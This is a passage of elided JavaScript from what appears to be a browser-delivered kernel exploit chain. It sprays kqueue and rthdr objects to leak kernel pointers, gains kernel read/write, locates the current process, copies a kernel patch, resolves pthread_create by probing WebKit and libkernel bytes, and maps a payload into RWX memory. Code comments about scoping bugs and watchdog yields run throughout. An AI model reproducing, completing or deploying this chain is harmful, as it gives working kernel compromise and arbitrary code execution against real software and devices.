...
import { createContext, layoutContext, breathe, breatheReset } from "./module/rop.js";
...
import {
    runChain, mark, state, check, trace, hx, checkCounts,
    hexByte, hexBytes,
} from "./module/log.js";
import { makeRpc } from "./workers.js";
import { COMMON, NETCTRL as C, NETCTRL_SYS } from "./module/constants.js";
/*
Shared address predicates (module/addr.js). netctrl used to define FOUR
spellings of "is this a kernel pointer" locally (kptr, kptr2, isKptr, and
an inline hi>=0xffff0000 test) plus kaddrOk, ptrish, aligned and same.
addr.js exists to hold these under names that say which question they
answer, and lapse.js already imports them; the aliases below keep every
call site in this file working unchanged.
*/
import {
    isKernelPtr, isKernelPtrAligned, isPtrish, isPlausibleBase, sameI64,
} from "./module/addr.js";
...
let allDone = false;
/*
FUNCTION-SCOPED MIRROR of payloadRunning.

payloadRunning is declared with `let` INSIDE the kernelview block
(`if (wrote) { ... }`), so it dies at that block's closing brace. The
reporting code below -- the status bar and the finally's REBOOT mark --
sits OUTSIDE that block and read it anyway: "Can't find variable:
payloadRunning", thrown AFTER a fully successful run. main.js saw the
ReferenceError, reported a failure, and the run looked like it had failed
when the payload was in fact running.

This is the same trap the code already warns about for jailbroken/curproc
("a let inside the try below would be block-scoped away from them -- a
runtime ReferenceError node --check cannot see"). Declared here, next to
allDone, so every reader shares one scope.
*/
...
async function runOriginal() {
    ...
    try {
        ...
        */
        ...
        const bufAddr = ab => bufferAddress(p, off, ab);   // module/syscall.js
       ...
       */
            ...
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                ...
                */
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    ...
                    if (kq === -1) {
                        mark("KQUEUE-EMFILE", "at=" + i + " open=" + openKq);
                    ...
                    getRthdr(triplets[0], KQUEUE_SIZE);
        ...
        */
        // module/addr.js: isKernelPtr / isKernelPtrAligned.
        const isKptr = isKernelPtr;
                ...
                if (wrote) {
                        ...
                        if (kptr2(curproc)) {
                            ...
                            async function pfind(target) {
                                ...
                                for (let n = 0; n < 4096; ++n) {
                                    ...
                                    /*
                                    WATCHDOG. Up to 4096 kernel reads through
                                    the pipe, synchronously, on the JS thread.
                                    Each step is one kv.read8 plus an int64
                                    mint; a full walk with no yield is tens of
                                    ms to seconds of unbroken main-thread work
                                    and is one of the "page isn't responding"
                                    popups. breathe() is the shared yield the
                                    rest of the tree already uses.
                                    */
                                    if ((++pfindSteps & 0x3f) === 0) await breathe();
                                }
                                return null;
                            }
                    ...
                    */
                        ...
                        if (gadgetOk && sysentOk && sitesOk) {
                            ...
                            if (mapAddr.hi > 0) {
                                ...
                                for (let i = 0; i < kpatch.length; ++i) {
                                    ...
                                    if ((i & 0x3ff) === 0x3ff) await breathe();
                                }
                                let copied = true;
                                for (let i = 0; i < kpatch.length; ++i) {
                    ...
                    function resolvePthreadCreate() {
                        ...
                        const bytes = [];
                        for (let i = 0; i < 16; ++i)
                            bytes.push(p.read1(cand.add32(i)));
                        mark("PTHREAD-BYTES", cand + " (webkit+0x"
                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
                            + bytes.map(b => (b < 16 ? "0" : "")
                                + (b & 0xff).toString(16)).join(" "));

                        /*
                        Same probe on libkernel's own RVA. Mostly diagnostic:
                        if webkit+0x2068 is NOT the pthread thunk on some
                        firmware, this second read shows what sitting at the
                        same RVA in libkernel looks like. lapse.js logs it too.
                        */
                        const alt = libkernelBase.add32(PTHREAD_CREATE_RVA);
                        const altBytes = [];
                        for (let i = 0; i < 16; ++i)
                            altBytes.push(p.read1(alt.add32(i)));
                        mark("PTHREAD-BYTES-ALT", alt + " (libkernel+0x"
                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
                            + altBytes.map(b => (b < 16 ? "0" : "")
                                + (b & 0xff).toString(16)).join(" "));

                        let target = null, how = "";
                        if (bytes[0] === 0xff && bytes[1] === 0x25) {
                            const rel = (bytes[2] | (bytes[3] << 8)
                                | (bytes[4] << 16) | (bytes[5] << 24)) | 0;
                            const got = rel >= 0 ? cand.add32(6 + rel)
                                : cand.add32(6).sub32(-rel);
                            const fn = p.read8(got);
                            const nearK = fn.hi === libkernelBase.hi;
                            const nearW = fn.hi === webkitBase.hi;
                            mark("PTHREAD-THUNK", "GOT " + got + " -> " + fn
                                + (nearK ? " (libkernel)" : nearW
                                    ? " (webkit)" : ""));
                            if (fn.hi > 0 && (fn.low & 7) === 0
                                || nearK || nearW) {
                                target = cand;
                                how = "validated import thunk";
                            }
                        } else if (bytes[0] === 0xf3 && bytes[1] === 0x0f
                            && bytes[2] === 0x1e && bytes[3] === 0xfa) {
                            target = cand;
                            how = "endbr64 prologue";
                        } else if (bytes[0] === 0x55
                            || (bytes[0] === 0x48 && bytes[1] === 0x83)
                            || (bytes[0] === 0x41 && bytes[1] === 0x57)) {
                            target = cand;
                        ...
                        if (off.wk___imp_pthread_create !== undefined
                            ...
                            if (agree) {
                                target = expect;
                                how = "verified offsets-table target";
                            }
                        }

                        /*
                        Same escape hatch lapse.js has: if every heuristic
                        above refuses and the operator is sure webkit+0x2068
                        is the pthread thunk, ?forcepthread=1 calls it anyway.
                        */
                    ...
                    if (payload && (kpatched || params.get("payload") === "1")
                        ...
                        mark("PAYLOAD-MAP", "size=0x" + sz.toString(16)
                            + " rwx=" + entry);
                        if (entry.hi > 0) {
                            /* Same shape as the kpatch copy: 2 x payload.length sync ops. */
                            breatheReset();
